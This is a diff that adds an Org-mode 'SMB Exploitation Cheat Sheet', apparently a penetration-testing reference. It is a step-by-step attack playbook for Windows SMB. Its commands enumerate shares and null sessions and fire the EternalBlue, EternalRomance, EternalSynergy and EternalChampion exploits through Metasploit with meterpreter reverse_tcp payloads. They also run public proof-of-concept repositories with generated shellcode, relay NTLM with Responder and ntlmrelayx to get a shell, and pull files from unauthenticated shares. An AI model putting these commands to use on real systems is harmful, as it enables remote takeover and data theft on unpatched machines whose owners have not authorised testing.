@@ -1,0 +1,199 @@
+#+TITLE: SMB Exploitation Cheat Sheet
+#+AUTHOR: Michael Plankl
+#+DATE: 2026-03-18
+
+| Finding              | Risk     | Primary Attack             |
+|----------------------+----------+----------------------------|
+| SMB 1.0              | Critical | EternalBlue, Null Sessions |
+| Signing not required | Critical | NTLM Relay                 |
+| SMB 3.1.1 present    | Medium   | SMBGhost (CVE-2020-0796)   |
+
+* Enumeration
+** Check EternalBlue
+#+begin_src bash
+nmap --script smb-vuln-ms17-010 -p 445 $IP
+#+end_src
+
+** Check Shares
+Without Credentials
+#+begin_src bash
+nmap --script=smb-enum-shares -p139,445 $IP
+smbmap -H $IP
+smbclient -L //$IP -N
+nxc smb $IP -u '' -p '' --shares
+#+end_src
+
+With Credentials
+#+begin_src bash
+# List shares with credentials  
+smbclient -L //target.com -U username%password  
+
+# Connect to specific share  
+smbclient //target.com/sharename -U username%password
+
+# With credentials  
+smbmap -H target.com -u username -p password  
+
+# Recursive enumeration  
+smbmap -H target.com -u username -p password -r
+#+end_src
+
+** Null Session Enumeration
+#+begin_src bash
+smbclient -L //$IP -N
+
+enum4linux -a $IP
+
+crackmapexec smb $IP --shares
+
+rpcclient -U "" -N $IP
+
+nxc smb $IP -u '' -p ''
+
+smbmap -H $IP -u "" -p ""
+#+end_src
+
+** Enumerate Hostname / NetBIOS-Name
+#+begin_src bash
+nmblookup -A $IP
+
+nxc smb $IP
+#+end_src
+
+** Enumerate General Information / Users
+#+begin_src bash
+nmap -p 445 --script smb-enum-all $IP
+
+enum4linux -a $IP
+
+enum4linux-ng.py -A $IP
+#+end_src
+
+* Exploitation
+
+| Exploit         | Mechanism                             | Go-to Tool             |
+|-----------------+---------------------------------------+------------------------|
+| EternalBlue     | Buffer overflow in SMBv1 transactions | ~ms17_010_eternalblue~ |
+| EternalRomance  | Named pipe write primitive            | ~ms17_010_psexec~      |
+| EternalSynergy  | Similar to Romance, newer targets     | ~ms17_010_psexec~      |
+| EternalChampion | Transaction2 race condition           | AutoBlue PoC           |
+
+* Priority Order
+#+BEGIN_EXAMPLE
+1.  nmap smb-vuln-ms17-010  →  if VULNERABLE, pick by OS:
+    ├─ Win XP / 2003         →  EternalChampion (eternalblue_exploit2.py)
+    ├─ Win 7 / 2008 R2       →  EternalBlue (ms17_010_eternalblue) or EternalRomance
+    ├─ Win 8 / 2012+         →  EternalSynergy (ms17_010_psexec)
+    └─ Unknown / fallback    →  AutoBlue (auto-selects best variant)
+2.  EternalBlue fails?       →  try ms17_010_psexec (Romance/Synergy)
+3.  All Eternals fail        →  NTLM Relay (Responder + ntlmrelayx)
+4.  nmap smb-vuln-cve-2020-0796 → if VULNERABLE → SMBGhost
+5.  Always try               →  Null session enum (no creds needed)
+#+END_EXAMPLE
+
+** EternalBlue - MS17-010 (SMB 1.0)
+#+begin_src text
+Requires: SMB 1.0 enabled + unpatched target
+#+end_src
+#+begin_src bash
+# Metasploit
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.150.10
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <your-ip>
+run
+#+end_src
+
+** EternalRomance - MS17-010 (SMB 1.0, x86/x64)
+#+BEGIN_SRC text
+Requires: SMB 1.0 + unpatched Windows (XP/Vista/7/Server 2003-2008 R2)
+Targets:  Named pipe (browser, spoolss, netlogon) — more reliable than EternalBlue
+Advantage: Works on x86 AND x64; better success rate on Server 2003/2008
+#+END_SRC
+#+BEGIN_SRC 
+# Metasploit
+use exploit/windows/smb/ms17_010_psexec   # uses EternalRomance/Synergy internally
+set RHOSTS 192.168.150.10
+set PAYLOAD windows/meterpreter/reverse_tcp   # x86 payload (module handles both arch)
+set LHOST <your-ip>
+run
+ 
+# Alternative: standalone PoC (Python)
+git clone https://github.com/helviojunior/MS17-010
+python send_and_execute.py 192.168.150.10 payload.exe
+#+END_SRC
+
+** EternalSynergy - MS17-010 (SMB 1.0, Win 8+)
+#+BEGIN_SRC text
+Requires: SMB 1.0 + Windows 8 / Server 2012 and later (newer targets)
+Advantage: Specifically designed for targets where EternalBlue fails
+Note:      ms17_010_psexec in Metasploit auto-selects Synergy for newer OS
+#+END_SRC
+#+BEGIN_SRC bash
+# Metasploit — same module, auto-selects the right exploit variant
+use exploit/windows/smb/ms17_010_psexec
+set RHOSTS 192.168.150.10
+set LHOST <your-ip>
+# Force Synergy if needed
+set EternalSynergy true
+run
+ 
+# Verify OS version first to confirm applicability
+nmap -O -p 445 192.168.150.10
+#+END_SRC
+
+** EternalChampion - MS17-010 (SMB 1.0, Transaction2)
+#+BEGIN_SRC text
+Requires: SMB 1.0 — exploits Transaction2 request race condition
+Targets:  Windows XP → Server 2008 R2 (x86/x64)
+Note:     Less commonly implemented in public frameworks; use PoC repo
+#+END_SRC
+#+BEGIN_SRC bash
+# AutoBlue framework covers all three variants automatically
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+cd AutoBlue-MS17-010
+ 
+# Step 1 — verify vulnerability
+python eternal_checker.py 192.168.150.10
+ 
+# Step 2 — generate shellcode payload
+chmod +x shell_prep.sh && ./shell_prep.sh   # follow prompts, set LHOST/LPORT
+ 
+# Step 3 — run (auto-selects best exploit: Blue/Romance/Champion/Synergy)
+python eternalblue_exploit7.py 192.168.150.10 shellcode/sc_x64.bin   # Win7/2008
+python eternalblue_exploit2.py 192.168.150.10 shellcode/sc_x64.bin   # XP/2003
+#+END_SRC
+
+** NTLM Relay (Signing not required)
+#+BEGIN_SRC text
+Requires: Signing disabled + active auth on the network
+#+END_SRC
+#+BEGIN_SRC bash
+# Terminal 1 — disable SMB/HTTP in Responder first
+nano /etc/responder/Responder.conf  # set SMB = Off, HTTP = Off
+responder -I eth0 -dPv
+ 
+# Terminal 2 — relay to target
+ntlmrelayx.py -t smb://192.168.150.10 -smb2support
+# Optional: get shell
+ntlmrelayx.py -t smb://192.168.150.10 -smb2support -i
+#+END_SRC
+ 
+** SMBGhost - CVE-2020-0796 (SMB 3.1.1)
+#+BEGIN_SRC text
+Requires: SMB 3.1.1 + compression enabled (Windows 10 1903-1909)
+#+END_SRC
+#+BEGIN_SRC bash
+# Check if vulnerable
+nmap --script smb-vuln-cve-2020-0796 -p 445 192.168.150.10
+ 
+# Metasploit (local privesc variant)
+use exploit/windows/local/cve_2020_0796_smbghost
+#+END_SRC
+
+** Null Session - Share Access
+#+BEGIN_SRC bash
+smbclient //$IP/<SHARE> -N
+# Browse and grab files
+get <file>
+#+END_SRC
